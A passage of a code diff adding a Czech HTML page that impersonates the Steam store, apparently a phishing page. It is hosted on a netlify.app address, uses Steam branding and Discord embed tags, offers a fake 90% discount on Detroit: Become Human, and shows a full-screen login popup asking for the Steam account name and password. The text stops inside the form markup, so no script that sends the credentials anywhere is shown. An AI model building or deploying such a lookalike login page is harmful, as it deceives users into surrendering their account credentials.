@@ -1,0 +1,1786 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Přihlásit se</title>
+    
+    <!-- Open Graph / Discord Embed -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://monumental-stardust-cd17fb.netlify.app/">
+    <meta property="og:site_name" content="Steam">
+    <meta property="og:title" content="Detroit: Become Human">
+    <meta property="og:description" content="Detroit: Become Human puts the destiny of both mankind and androids in your hands, taking you to a near future where machines have become more intelligent than humans. Every choice you make affects the outcome of the game.">
+    <meta property="og:image" content="https://cdn.akamai.steamstatic.com/steam/apps/1222140/header.jpg">
+    <meta property="og:image:secure_url" content="https://cdn.akamai.steamstatic.com/steam/apps/1222140/header.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="616">
+    <meta property="og:image:height" content="353">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@steam">
+    <meta name="twitter:title" content="Detroit: Become Human">
+    <meta name="twitter:description" content="Detroit: Become Human - Every choice affects the outcome.">
+    <meta name="twitter:image" content="https://cdn.akamai.steamstatic.com/steam/apps/1222140/header.jpg">
+    
+    <!-- Theme color for Discord - dark -->
+    <meta name="theme-color" content="#1b2838">
+    
+    <!-- Additional meta -->
+    <meta name="description" content="Detroit: Become Human - Příběhová adventura od Quantic Dream. SLEVA 90%!">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/steam_logo.svg">
+    <link rel="icon" type="image/x-icon" href="https://store.steampowered.com/favicon.ico">
+    <link rel="apple-touch-icon" href="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/steam_logo.svg">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg-dark: #1b2838;
+            --bg-darker: #171a21;
+            --bg-card: #16202d;
+            --text-primary: #c7d5e0;
+            --text-secondary: #66c0f4;
+            --text-muted: #8f98a0;
+            --accent-blue: #1a9fff;
+            --accent-green: #5c7e10;
+        }
+
+        body {
+            font-family: 'IBM Plex Sans', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            min-height: 100vh;
+        }
+
+        /* Top Bar */
+        .top-bar {
+            background: var(--bg-darker);
+            padding: 6px 0;
+        }
+
+        .top-bar-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 12px;
+            padding: 0 20px;
+        }
+
+        .install-btn {
+            background: linear-gradient(135deg, #4a7c10, #5c9e10, #4a7c10);
+            color: #d2e885;
+            padding: 4px 18px;
+            border-radius: 2px;
+            font-size: 11px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .install-btn:hover { color: white; }
+        .install-btn svg { width: 14px; height: 14px; fill: currentColor; }
+
+        .top-link {
+            color: var(--text-muted);
+            font-size: 11px;
+            text-decoration: none;
+        }
+
+        .top-link:hover { color: white; }
+
+        /* Header */
+        .header {
+            background: rgba(23, 26, 33, 0.95);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            height: 60px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+            margin-right: 40px;
+        }
+
+        .logo img { height: 36px; }
+
+        .main-nav { display: flex; gap: 6px; }
+
+        .nav-link {
+            color: var(--text-primary);
+            text-decoration: none;
+            font-size: 13px;
+            padding: 8px 14px;
+            text-transform: uppercase;
+        }
+
+        .nav-link:hover { color: white; background: rgba(255,255,255,0.08); border-radius: 3px; }
+        .nav-link.active { color: white; border-bottom: 2px solid var(--accent-blue); }
+
+        /* Sub Navigation */
+        .sub-nav {
+            background: linear-gradient(180deg, #2a475e 0%, var(--bg-dark) 100%);
+            padding: 10px 0;
+        }
+
+        .sub-nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .sub-nav-links { display: flex; gap: 4px; }
+
+        .sub-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 12px;
+            padding: 6px 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .sub-link:hover { background: rgba(255,255,255,0.1); color: white; border-radius: 3px; }
+        .sub-link svg { width: 12px; height: 12px; fill: currentColor; }
+
+        .search-box {
+            display: flex;
+            background: rgba(32, 60, 80, 0.8);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .search-box input {
+            background: transparent;
+            border: none;
+            padding: 8px 14px;
+            color: var(--text-primary);
+            font-size: 13px;
+            width: 220px;
+            outline: none;
+        }
+
+        .search-box input::placeholder { color: var(--text-muted); }
+
+        .search-btn {
+            background: var(--accent-blue);
+            border: none;
+            padding: 8px 14px;
+            cursor: pointer;
+        }
+
+        .search-btn svg { width: 16px; height: 16px; fill: white; }
+
+        /* Main Content */
+        .main-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            padding-bottom: 100px;
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .section-title {
+            font-size: 14px;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .section-btn {
+            background: transparent;
+            border: 1px solid var(--text-muted);
+            color: var(--text-primary);
+            padding: 6px 14px;
+            border-radius: 2px;
+            font-size: 11px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .section-btn:hover { border-color: white; color: white; }
+
+        /* Game Page Header */
+        .game-page-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .breadcrumb { font-size: 12px; color: var(--text-muted); }
+        .breadcrumb a { color: var(--text-muted); text-decoration: none; }
+        .breadcrumb a:hover { color: white; }
+        .breadcrumb span { color: var(--text-primary); }
+
+        .community-btn {
+            background: linear-gradient(135deg, #2b5876 0%, #4e92b1 100%);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 2px;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .community-btn:hover { background: linear-gradient(135deg, #3a6d8c 0%, #5ca3c4 100%); }
+
+        .game-page-title {
+            font-size: 26px;
+            color: white;
+            font-weight: 400;
+            margin-bottom: 15px;
+        }
+
+        /* Featured */
+        .featured-section {
+            display: grid;
+            grid-template-columns: 1fr 340px;
+            background: linear-gradient(135deg, #1e3a4c, var(--bg-card));
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+
+        .featured-main {
+            position: relative;
+            aspect-ratio: 16/9;
+            overflow: hidden;
+        }
+
+        .featured-image { width: 100%; height: 100%; object-fit: cover; }
+
+        .featured-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 40px 30px 30px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+        }
+
+        .featured-title {
+            font-size: 42px;
+            font-weight: 700;
+            color: #a8d83a;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .carousel-nav {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 50px;
+            height: 80px;
+            background: rgba(0,0,0,0.5);
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .carousel-nav svg { width: 24px; height: 24px; fill: white; }
+        .carousel-prev { left: 0; }
+        .carousel-next { right: 0; }
+
+        .carousel-dots {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 8px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.3);
+            cursor: pointer;
+        }
+
+        .dot.active { background: white; }
+
+        .featured-sidebar { padding: 20px; display: flex; flex-direction: column; background: #0a1218; }
+        .sidebar-title { font-size: 20px; color: white; margin-bottom: 15px; }
+
+        .sidebar-game-image { margin-bottom: 15px; border-radius: 4px; overflow: hidden; }
+        .sidebar-game-image img { width: 100%; height: auto; }
+
+        .sidebar-description { color: var(--text-primary); font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
+
+        .sidebar-info { margin-bottom: 20px; }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 12px; }
+        .info-label { color: #556772; text-transform: uppercase; font-size: 10px; }
+        .info-value { color: var(--text-primary); }
+        .info-value.positive { color: #66c0f4; }
+        .info-value.link { color: #67c1f5; cursor: pointer; }
+        .info-value.link:hover { text-decoration: underline; }
+
+        .sidebar-tags { margin-top: auto; }
+        .sidebar-tags-label { color: #556772; font-size: 11px; display: block; margin-bottom: 8px; }
+        .sidebar-tags-list { display: flex; flex-wrap: wrap; gap: 5px; }
+        .sidebar-tag { background: rgba(103, 193, 245, 0.2); color: #67c1f5; padding: 4px 8px; border-radius: 2px; font-size: 11px; cursor: pointer; }
+        .sidebar-tag:hover { background: rgba(103, 193, 245, 0.3); }
+
+        .screenshot-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .screenshot { aspect-ratio: 16/9; border-radius: 4px; overflow: hidden; }
+        .screenshot img { width: 100%; height: 100%; object-fit: cover; }
+
+        .game-status { margin-top: auto; }
+
+        .status-badge {
+            display: inline-block;
+            background: #4c6b22;
+            color: #a8d83a;
+            padding: 4px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            margin-bottom: 8px;
+        }
+
+        .status-text { font-size: 13px; color: var(--text-muted); }
+
+        /* Banner */
+        .banner {
+            background: linear-gradient(135deg, #2a475e, #1b3a5c);
+            border-radius: 6px;
+            padding: 25px 30px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 30px;
+        }
+
+        .banner-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ff6b35, #f7931e);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .banner-icon svg { width: 48px; height: 48px; fill: white; }
+        .banner-subtitle { font-size: 14px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 2px; }
+        .banner-title { font-size: 32px; font-weight: 700; color: white; }
+
+        /* Sales */
+        .sales-section { margin-bottom: 40px; }
+
+        .sales-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 280px;
+            gap: 12px;
+        }
+
+        .sale-card {
+            background: var(--bg-card);
+            border-radius: 6px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+
+        .sale-card:hover { transform: translateY(-3px); }
+
+        .sale-card-large { position: relative; }
+        .sale-card-large img { width: 100%; height: 200px; object-fit: cover; }
+
+        .sale-info {
+            padding: 15px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+        }
+
+        .sale-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; }
+        .sale-ends { font-size: 11px; color: var(--text-muted); }
+        .sale-discount { font-size: 24px; font-weight: 700; color: #a8d83a; }
+
+        .sale-sidebar { display: flex; flex-direction: column; gap: 12px; }
+
+        .sale-small { background: var(--bg-card); border-radius: 6px; overflow: hidden; position: relative; }
+        .sale-small img { width: 100%; height: 100px; object-fit: cover; }
+        .sale-small-info { padding: 10px; }
+
+        .live-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: #e74c3c;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 2px;
+            font-size: 9px;
+            font-weight: 600;
+            position: absolute;
+            top: 8px;
+            left: 8px;
+        }
+
+        .live-badge::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .sale-price-row { display: flex; align-items: center; gap: 8px; }
+
+        .discount-badge {
+            background: var(--accent-green);
+            color: #c6e056;
+            padding: 2px 6px;
+            border-radius: 2px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .old-price { text-decoration: line-through; color: var(--text-muted); font-size: 11px; }
+        .new-price { color: #a8d83a; font-weight: 600; font-size: 13px; }
+
+        /* Categories */
+        .categories-section { margin-bottom: 40px; }
+        .categories-carousel { display: flex; gap: 12px; }
+
+        .category-card {
+            flex: 0 0 calc(25% - 9px);
+            background: linear-gradient(135deg, rgba(103, 193, 245, 0.3), rgba(103, 193, 245, 0.1));
+            border-radius: 6px;
+            overflow: hidden;
+            position: relative;
+            height: 180px;
+            cursor: pointer;
+        }
+
+        .category-card img { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
+
+        .category-label {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            color: #1b2838;
+            padding: 8px 16px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+
+        /* Steam Deck */
+        .steam-deck-section { margin-bottom: 40px; }
+
+        .deck-games-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .deck-game-card {
+            background: var(--bg-card);
+            border-radius: 6px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+
+        .deck-game-card img { width: 100%; height: 120px; object-fit: cover; }
+        .deck-game-price { padding: 8px 12px; font-size: 13px; color: white; }
+
+        .steam-deck-banner {
+            background: linear-gradient(135deg, #1a1a2e, #4a1a6b);
+            border-radius: 6px;
+            overflow: hidden;
+            position: relative;
+            height: 250px;
+        }
+
+        .steam-deck-banner img { width: 100%; height: 100%; object-fit: cover; }
+
+        .steam-deck-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: white;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .steam-deck-logo svg { width: 24px; height: 24px; fill: #ff6b6b; }
+
+        .steam-deck-tagline {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(90deg, #ff6b6b, #ee5a5a);
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        /* Login Prompt */
+        .login-prompt {
+            background: var(--bg-card);
+            border-radius: 6px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .login-prompt p { color: var(--text-muted); margin-bottom: 15px; }
+
+        .login-btn {
+            background: var(--accent-blue);
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 3px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-prompt a { color: var(--text-secondary); }
+
+        /* Shop Sections */
+        .shop-sections {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+
+        .shop-section-btn {
+            background: var(--accent-blue);
+            color: white;
+            padding: 14px 20px;
+            border-radius: 3px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .shop-section-btn:hover { background: #0d8ce9; }
+
+        /* Under 10 */
+        .under-section { margin-bottom: 40px; }
+        .price-tabs { display: flex; gap: 8px; }
+
+        .price-tab {
+            background: transparent;
+            border: 1px solid var(--text-muted);
+            color: var(--text-primary);
+            padding: 6px 14px;
+            border-radius: 2px;
+            font-size: 11px;
+            cursor: pointer;
+        }
+
+        .price-tab.active { background: var(--text-muted); color: var(--bg-darker); }
+
+        .under-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .under-card {
+            background: var(--bg-card);
+            border-radius: 6px;
+            overflow: hidden;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .under-card img { width: 100%; height: 140px; object-fit: cover; }
+        .under-card-info { padding: 10px; }
+
+        /* Game List */
+        .game-list-section { margin-bottom: 40px; }
+
+        .list-tabs {
+            display: flex;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .list-tab {
+            padding: 12px 20px;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 13px;
+            border: none;
+            background: none;
+            border-bottom: 2px solid transparent;
+        }
+
+        .list-tab:hover { color: white; }
+        .list-tab.active { color: white; background: rgba(103, 193, 245, 0.1); border-bottom: 2px solid var(--accent-blue); }
+
+        .game-list-container {
+            display: grid;
+            grid-template-columns: 1fr 340px;
+            background: var(--bg-card);
+        }
+
+        .game-list { border-right: 1px solid rgba(255,255,255,0.05); }
+
+        .game-list-item {
+            display: grid;
+            grid-template-columns: 120px 1fr auto auto;
+            gap: 15px;
+            align-items: center;
+            padding: 10px 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            cursor: pointer;
+        }
+
+        .game-list-item:hover { background: rgba(255,255,255,0.05); }
+        .game-list-item.active { background: rgba(103, 193, 245, 0.1); }
+
+        .game-list-thumb { width: 120px; height: 45px; object-fit: cover; border-radius: 3px; }
+
+        .game-list-info h4 { color: white; font-size: 13px; margin-bottom: 4px; }
+        .game-list-info p { color: var(--text-muted); font-size: 11px; }
+
+        .game-list-platforms { display: flex; gap: 6px; }
+        .game-list-platforms svg { width: 14px; height: 14px; fill: var(--text-muted); }
+
+        .game-list-price { text-align: right; font-size: 13px; }
+        .game-list-price .price-val { color: white; }
+        .game-list-price .date { color: var(--text-muted); font-size: 10px; }
+
+        .game-preview { padding: 20px; }
+        .game-preview h3 { color: white; font-size: 18px; margin-bottom: 10px; }
+
+        .game-preview-rating {
+            background: #4c6b22;
+            color: #a8d83a;
+            padding: 6px 10px;
+            border-radius: 3px;
+            font-size: 11px;
+            margin-bottom: 15px;
+            display: inline-block;
+        }
+
+        .game-preview-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 15px; }
+
+        .game-preview-tag {
+            background: rgba(103, 193, 245, 0.2);
+            color: var(--text-secondary);
+            padding: 4px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+        }
+
+        .game-preview-screenshots { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
+        .game-preview-screenshots img { width: 100%; height: 80px; object-fit: cover; border-radius: 3px; }
+
+        /* VR */
+        .vr-section { margin-bottom: 40px; }
+        .vr-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+
+        .vr-card {
+            background: var(--bg-card);
+            border-radius: 6px;
+            overflow: hidden;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .vr-card img { width: 100%; height: 140px; object-fit: cover; }
+
+        .vr-card-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 10px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+        }
+
+        .vr-card-title { color: white; font-size: 12px; font-weight: 600; margin-bottom: 4px; }
+        .vr-card-price { color: #a8d83a; font-size: 12px; }
+
+        /* Footer */
+        .footer {
+            background: var(--bg-darker);
+            padding: 40px 0 30px;
+            margin-top: 40px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 20px;
+        }
+
+        .footer-valve img, .footer-steam-logo img { height: 30px; opacity: 0.7; }
+
+        .footer-legal { color: var(--text-muted); font-size: 11px; line-height: 1.8; margin-bottom: 20px; }
+
+        .footer-links { display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 20px; }
+        .footer-links a { color: var(--text-muted); font-size: 11px; text-decoration: none; }
+        .footer-links a:hover { color: white; }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .footer-bottom-links { display: flex; gap: 20px; }
+        .footer-bottom-links a { color: var(--text-muted); font-size: 11px; text-decoration: none; }
+
+        .footer-social { display: flex; gap: 15px; }
+        .footer-social a { color: var(--text-muted); font-size: 18px; }
+
+        /* Cookie */
+        .cookie-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(180deg, #1e3a4c, var(--bg-darker));
+            border-top: 3px solid var(--accent-blue);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 30px;
+            z-index: 1000;
+        }
+
+        .cookie-text { max-width: 700px; font-size: 13px; color: var(--text-primary); }
+        .cookie-text a { color: var(--text-secondary); }
+
+        .cookie-buttons { display: flex; gap: 10px; }
+
+        .cookie-btn {
+            padding: 10px 20px;
+            border-radius: 3px;
+            font-size: 13px;
+            cursor: pointer;
+            border: none;
+        }
+
+        .cookie-btn.accept { background: var(--accent-blue); color: white; }
+        .cookie-btn.decline { background: rgba(255,255,255,0.1); color: var(--text-primary); border: 1px solid rgba(255,255,255,0.2); }
+
+        @media (max-width: 1024px) {
+            .featured-section, .game-list-container { grid-template-columns: 1fr; }
+            .featured-sidebar, .game-preview { display: none; }
+            .sales-grid, .categories-carousel, .deck-games-grid, .shop-sections, .under-grid, .vr-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+
+        @media (max-width: 768px) {
+            .sales-grid, .categories-carousel, .deck-games-grid, .shop-sections, .under-grid, .vr-grid { grid-template-columns: 1fr; }
+            .cookie-banner { flex-direction: column; text-align: center; }
+            .login-popup-content { flex-direction: column; }
+            .login-popup { width: 95%; padding: 20px; }
+        }
+
+        /* Login Popup */
+        .login-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            backdrop-filter: blur(5px);
+        }
+
+        .login-popup-overlay.hidden { display: none; }
+
+        .login-popup {
+            background: linear-gradient(180deg, #2a2d33 0%, #1a1c20 100%);
+            border-radius: 8px;
+            padding: 40px;
+            max-width: 750px;
+            width: 90%;
+            position: relative;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .login-popup-close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 28px;
+            cursor: pointer;
+        }
+
+        .login-popup-close:hover { color: white; }
+
+        .login-popup-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 30px;
+        }
+
+        .login-popup-content { display: flex; gap: 50px; }
+
+        .login-form-section { flex: 1; }
+
+        .login-label {
+            display: block;
+            color: var(--text-secondary);
+            font-size: 11px;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .login-input {
+            width: 100%;
+            background: #32353c;
+            border: 1px solid #32353c;
+            border-radius: 3px;
+            padding: 12px 14px;
+            color: white;
+            font-size: 14px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+
+        .login-input:focus { border-color: var(--text-secondary); }
+
+        .password-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .password-wrapper .login-input {
+            padding-right: 45px;
+        }
+
+        /* Skryti vychoziho oka prohlizece */
+        .password-wrapper .login-input::-ms-reveal,
+        .password-wrapper .login-input::-ms-clear,
+        .password-wrapper .login-input::-webkit-credentials-auto-fill-button,
+        .password-wrapper .login-input::-webkit-password-toggle,
+        input[type="password"]::-ms-reveal,
+        input[type="password"]::-ms-clear,
+        input[type="password"]::-webkit-credentials-auto-fill-button {
+            display: none !important;
+            -webkit-appearance: none !important;
+        }
+
+        #loginPassword::-ms-reveal,
+        #loginPassword::-ms-clear {
+            display: none !important;
+        }
+
+        .eye-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(calc(-50% - 10px));
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .eye-toggle svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--text-muted);
+            transition: fill 0.2s;
+        }
+
+        .eye-toggle:hover svg {
+            fill: var(--text-primary);
+        }
+
+        .eye-toggle .eye-open { display: none; }
+        .eye-toggle .eye-closed { display: block; }
+        .eye-toggle.showing .eye-open { display: block; }
+        .eye-toggle.showing .eye-closed { display: none; }
+
+        .login-remember {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            font-size: 13px;
+        }
+
+        .login-remember input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--accent-blue);
+        }
+
+        .login-submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #2b5876 0%, #4e92b1 100%);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .login-submit-btn:hover { background: linear-gradient(135deg, #3a6d8c 0%, #5ca3c4 100%); }
+
+        .login-help-link {
+            color: var(--text-secondary);
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .login-help-link:hover { text-decoration: underline; }
+
+        .login-error {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            min-height: 18px;
+        }
+
+        .login-input.error {
+            border-color: #e74c3c;
+        }
+
+        .login-success {
+            color: #a8d83a;
+            font-size: 14px;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .login-qr-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .qr-code-container {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+        }
+
+        .qr-loading-spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            margin-top: -35px;
+            margin-left: -35px;
+            width: 70px;
+            height: 70px;
+            border: 4px solid rgba(102, 192, 244, 0.2);
+            border-top-color: var(--text-secondary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            z-index: 10;
+            transition: opacity 0.3s;
+        }
+
+        .qr-loading-spinner.hidden {
+            opacity: 0;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .qr-code-placeholder {
+            opacity: 0.4;
+            filter: blur(8px) brightness(0.5);
+            transition: all 0.5s ease;
+        }
+
+        .qr-code-placeholder.loaded {
+            opacity: 1;
+            filter: blur(0) brightness(1);
+        }
+
+        .qr-code-placeholder svg {
+            width: 200px;
+            height: 200px;
+        }
+
+        .qr-code-real {
+            width: 200px;
+            height: 200px;
+            border-radius: 8px;
+        }
+
+        .qr-info {
+            color: var(--text-muted);
+            font-size: 12px;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .qr-info a { color: var(--text-secondary); text-decoration: none; }
+        .qr-info a:hover { text-decoration: underline; }
+
+        /* Error Toast */
+        .error-toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: linear-gradient(135deg, #c0392b, #e74c3c);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            z-index: 3000;
+            opacity: 0;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .error-toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .error-toast svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+    </style>
+</head>
+<body>
+    <!-- Error Toast -->
+    <div class="error-toast" id="errorToast">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        <span id="errorToastMessage">Tato funkce není dostupná</span>
+    </div>
+
+    <!-- Login Popup -->
+    <div class="login-popup-overlay" id="loginPopup">
+        <div class="login-popup">
+            <h1 class="login-popup-title">Přihlášení</h1>
+            <div class="login-popup-content">
+                <div class="login-form-section">
+                    <label class="login-label">PŘIHLASTE SE POMOCÍ NÁZVU ÚČTU</label>
+                    <input type="text" class="login-input" id="loginEmail">
+                    <div class="login-error" id="emailError"></div>
+                    <label class="login-label">HESLO</label>
+                    <div class="password-wrapper">
+                        <input type="password" class="login-input" id="loginPassword">
+                        <button type="button" class="eye-toggle" id="eyeToggle" onclick="togglePassword()">
+                            <svg class="eye-open" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
